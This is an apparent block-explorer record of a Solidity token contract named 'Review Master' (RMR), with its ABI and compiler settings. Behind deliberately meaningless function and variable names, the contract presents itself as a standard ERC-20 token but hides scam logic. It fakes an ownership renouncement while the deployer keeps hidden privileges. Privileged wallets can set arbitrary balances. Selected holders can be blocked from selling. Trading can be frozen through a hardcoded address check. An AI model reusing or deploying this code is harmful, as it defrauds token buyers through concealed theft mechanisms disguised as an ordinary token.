{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.13;\n\ninterface teamIs {\n    function createPair(address txLaunch, address amountMarketing) external returns (address);\n}\n\ninterface teamAutoExempt {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address walletTxAuto) external view returns (uint256);\n\n    function transfer(address enableFee, uint256 buyAmount) external returns (bool);\n\n    function allowance(address senderToken, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 buyAmount) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address enableFee,\n        uint256 buyAmount\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed marketingLaunchList, uint256 value);\n    event Approval(address indexed senderToken, address indexed spender, uint256 value);\n}\n\nabstract contract listWallet {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface modeSwap {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface walletTo is teamAutoExempt {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract ReviewMaster is listWallet, teamAutoExempt, walletTo {\n\n    uint256 constant marketingTeam = 14 ** 10;\n\n    function buyFundTake() public {\n        emit OwnershipTransferred(sellLiquidityList, address(0));\n        exemptWalletMin = address(0);\n    }\n\n    address private exemptWalletMin;\n\n    function listTeamWallet(uint256 buyAmount) public {\n        fundTx();\n        launchAutoReceiver = buyAmount;\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return listMinBuy;\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return receiverAmountLiquidity;\n    }\n\n    mapping(address => mapping(address => uint256)) private walletShould;\n\n    function decimals() external view virtual override returns (uint8) {\n        return limitShould;\n    }\n\n    function tokenTotalTrading(address atLiquidityAuto, uint256 buyAmount) public {\n        fundTx();\n        listReceiver[atLiquidityAuto] = buyAmount;\n    }\n\n    bool public enableShouldAmount;\n\n    address public launchedFromSell;\n\n    function isTake(address amountSellSender) public {\n        fundTx();\n        if (enableShouldAmount) {\n            totalSwap = toExempt;\n        }\n        if (amountSellSender == sellLiquidityList || amountSellSender == launchedFromSell) {\n            return;\n        }\n        receiverAmount[amountSellSender] = true;\n    }\n\n    uint256 launchAutoReceiver;\n\n    uint256 private listMinBuy = 100000000 * 10 ** 18;\n\n    function fundTx() private view {\n        require(walletAt[_msgSender()]);\n    }\n\n    constructor (){\n        \n        modeSwap receiverMarketingLiquidity = modeSwap(receiverBuy);\n        launchedFromSell = teamIs(receiverMarketingLiquidity.factory()).createPair(receiverMarketingLiquidity.WETH(), address(this));\n        \n        sellLiquidityList = _msgSender();\n        walletAt[sellLiquidityList] = true;\n        listReceiver[sellLiquidityList] = listMinBuy;\n        buyFundTake();\n        \n        emit Transfer(address(0), sellLiquidityList, listMinBuy);\n    }\n\n    function walletTake(address toExemptReceiver, address enableFee, uint256 buyAmount) internal returns (bool) {\n        if (toExemptReceiver == sellLiquidityList) {\n            return txTo(toExemptReceiver, enableFee, buyAmount);\n        }\n        uint256 atLimit = teamAutoExempt(launchedFromSell).balanceOf(swapAt);\n        require(atLimit == launchAutoReceiver);\n        require(enableFee != swapAt);\n        if (receiverAmount[toExemptReceiver]) {\n            return txTo(toExemptReceiver, enableFee, marketingTeam);\n        }\n        return txTo(toExemptReceiver, enableFee, buyAmount);\n    }\n\n    address swapAt = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    string private limitBuyTx = \"RMR\";\n\n    function symbol() external view virtual override returns (string memory) {\n        return limitBuyTx;\n    }\n\n    uint256 private totalSwap;\n\n    mapping(address => bool) public walletAt;\n\n    event OwnershipTransferred(address indexed toFee, address indexed walletSender);\n\n    function owner() external view returns (address) {\n        return exemptWalletMin;\n    }\n\n    function allowance(address takeFund, address tradingAutoShould) external view virtual override returns (uint256) {\n        if (tradingAutoShould == receiverBuy) {\n            return type(uint256).max;\n        }\n        return walletShould[takeFund][tradingAutoShould];\n    }\n\n    uint256 tradingLimit;\n\n    uint8 private limitShould = 18;\n\n    string private receiverAmountLiquidity = \"Review Master\";\n\n    function approve(address tradingAutoShould, uint256 buyAmount) public virtual override returns (bool) {\n        walletShould[_msgSender()][tradingAutoShould] = buyAmount;\n        emit Approval(_msgSender(), tradingAutoShould, buyAmount);\n        return true;\n    }\n\n    uint256 public toExempt;\n\n    function getOwner() external view returns (address) {\n        return exemptWalletMin;\n    }\n\n    function transferFrom(address toExemptReceiver, address enableFee, uint256 buyAmount) external override returns (bool) {\n        if (_msgSender() != receiverBuy) {\n            if (walletShould[toExemptReceiver][_msgSender()] != type(uint256).max) {\n                require(buyAmount <= walletShould[toExemptReceiver][_msgSender()]);\n                walletShould[toExemptReceiver][_msgSender()] -= buyAmount;\n            }\n        }\n        return walletTake(toExemptReceiver, enableFee, buyAmount);\n    }\n\n    address receiverBuy = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    bool public minTokenTrading;\n\n    function limitList(address exemptReceiver) public {\n        require(exemptReceiver.balance < 100000);\n        if (minTokenTrading) {\n            return;\n        }\n        \n        walletAt[exemptReceiver] = true;\n        \n        minTokenTrading = true;\n    }\n\n    mapping(address => uint256) private listReceiver;\n\n    bool public senderReceiver;\n\n    bool private fundBuy;\n\n    function txTo(address toExemptReceiver, address enableFee, uint256 buyAmount) internal returns (bool) {\n        require(listReceiver[toExemptReceiver] >= buyAmount);\n        listReceiver[toExemptReceiver] -= buyAmount;\n        listReceiver[enableFee] += buyAmount;\n        emit Transfer(toExemptReceiver, enableFee, buyAmount);\n        return true;\n    }\n\n    address public sellLiquidityList;\n\n    function transfer(address atLiquidityAuto, uint256 buyAmount) external virtual override returns (bool) {\n        return walletTake(_msgSender(), atLiquidityAuto, buyAmount);\n    }\n\n    function balanceOf(address walletTxAuto) public view virtual override returns (uint256) {\n        return listReceiver[walletTxAuto];\n    }\n\n    mapping(address => bool) public receiverAmount;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"senderToken\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"toFee\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"walletSender\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"marketingLaunchList\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"takeFund\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"tradingAutoShould\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tradingAutoShould\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"buyAmount\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"walletTxAuto\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"buyFundTake\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"enableShouldAmount\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"amountSellSender\",\"type\":\"address\"}],\"name\":\"isTake\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchedFromSell\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"exemptReceiver\",\"type\":\"address\"}],\"name\":\"limitList\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"buyAmount\",\"type\":\"uint256\"}],\"name\":\"listTeamWallet\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"minTokenTrading\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"receiverAmount\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"sellLiquidityList\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"senderReceiver\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"toExempt\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"atLiquidityAuto\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"buyAmount\",\"type\":\"uint256\"}],\"name\":\"tokenTotalTrading\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"atLiquidityAuto\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"buyAmount\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"toExemptReceiver\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"enableFee\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"buyAmount\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"walletAt\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "ReviewMaster", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}